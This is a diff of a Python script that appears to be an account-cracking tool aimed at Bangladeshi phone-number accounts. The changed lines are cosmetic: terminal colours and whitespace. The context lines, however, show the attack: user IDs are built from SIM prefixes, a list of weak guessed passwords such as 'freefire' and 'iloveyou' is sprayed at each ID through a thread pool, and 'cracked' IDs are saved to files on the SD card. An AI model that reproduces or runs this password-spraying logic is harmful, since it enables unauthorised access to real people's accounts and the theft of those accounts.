@@ -217,14 +217,14 @@ def BRA():
 		
 		print('\033[32;1m┏━[\033[34;1m•\033[32;5m] TOTAL ACCOUNT ► '+tl)
 		print('\033[32;1m┣━[\033[34;1m•\033[32;5m] COUNTRY       ► Bangladesh')
-		print(f'\033[32;1m┣━[\033[34;1m•\033[32;5m] SIM CODE      ► \033[1;92m {kode} ')
-		print('\033[32;1m┗━[\033[34;1m•\033[32;5m] IF NO RESULTS \033[1;93m(ON/OFF) AIRPLANE MODE')
+		print(f'\033[32;1m┣━[\033[34;1m•\033[32;5m] SIM CODE      ► {kode} ')
+		print('\033[32;1m┗━[\033[34;1m•\033[32;5m] IF NO RESULTS \033[1;93m(ON/OFF) \033[32;5mAIRPLANE MODE')
 		print('\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 		for guru in user:
 			uid = kode+koda+kodb+guru
 			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','freefire','Free fire','iloveyou','Bangladesh','bangladesh','i love you']
 			yaari.submit(b,uid,pwx,tl)
-
+    
 	print(' [💀] CRACK PROCESS HAS BEEN COMPLETED')
 	print(' [🖤] IDS SAVED IN SDCARD ▶ BRA-OK.txt [OR] BRA-CP.txt')
 
@@ -290,3 +290,4 @@ def b(uid,pwx,tl):
         pass
 Main()
 
+	
